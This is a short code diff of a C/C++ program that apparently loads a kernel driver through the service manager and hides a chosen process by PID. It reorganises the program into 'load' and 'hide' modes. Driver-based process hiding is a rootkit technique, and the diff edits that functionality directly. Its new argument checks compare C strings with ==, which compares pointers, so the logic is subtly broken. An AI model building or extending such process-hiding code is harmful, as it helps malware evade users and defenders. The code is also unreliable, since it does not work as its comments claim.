@@ -44,7 +44,7 @@ int main(int argc, char *argv[])
 	Logs::log = new Log();
 	Logs::log->WriteLine("\n\nstarted...\n");
 #endif
-	if (argc < 2)
+	if (argc < 2 || argv[1] == "hide" && argc < 3)
 	{
 #ifdef DEBUG
 		printf("Not enougth arguments");
@@ -62,7 +62,8 @@ int main(int argc, char *argv[])
 	system(buff);
 #endif
 #if defined SCM_LOAD || defined TRY_LOAD
-	if (loadSysFile(driverName, displayName, serviceName) && hideProcess(displayName, atoi(argv[1]))) // atoi = (char[]) argument to integer
+	if (argv[1] == "load" && loadSysFile(driverName, displayName, serviceName) || // if need to load
+		argv[1] == "hide" && hideProcess(displayName, atoi(argv[2]) /* atoi = (char[]) argument to integer */ )) // if need to hide 
 #ifdef DEBUG
 		printf("success");
 #else
